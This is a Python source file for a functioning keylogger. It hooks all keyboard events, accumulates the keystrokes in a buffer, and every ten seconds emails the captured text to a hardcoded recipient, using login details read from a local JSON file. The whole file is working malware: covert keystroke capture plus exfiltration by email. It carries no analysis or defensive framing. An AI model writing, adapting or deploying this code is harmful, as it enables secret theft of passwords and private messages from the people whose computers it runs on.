import keyboard
import time
from emailer import Emailer
import json

local_buffer = ""
recipients = ["bringolfj@hotmail.com"]
class Keylogger:
    def __init__(self, email: str, password: str) -> None:
        self.email = email
        self.password = password

    def __handle_key_press(self, event):
        # On key down, add the key to the local buffer
        if event.event_type == "down":
            self.local_buffer += event.name

    def __email_local_buffer(self, emailer: Emailer) -> bool:
        # TODO: Add parsing / ai stuff
        try:
            emailer.send_email("Keylogger Info", self.local_buffer)
            print("Email sent successfully")
            return True
        except Exception as e:
            print(e)
            return False
        finally:
            # Reset the local buffer
            self.local_buffer = ""
            print("Reset local buffer")

    def run(self) -> None:
        # Local raw data to use in the email
        self.local_buffer = ""
        keyboard.hook(self.__handle_key_press)

        emailer = Emailer(self.email, self.password)
        while True:
            time.sleep(10)
            self.__email_local_buffer(emailer)

if __name__ == "__main__":
    with open("./email_info.json", 'r') as email_file:
        email_info = json.load(email_file)

    k = Keylogger(email_info["email"], email_info["applicationPassword"])
    k.run()
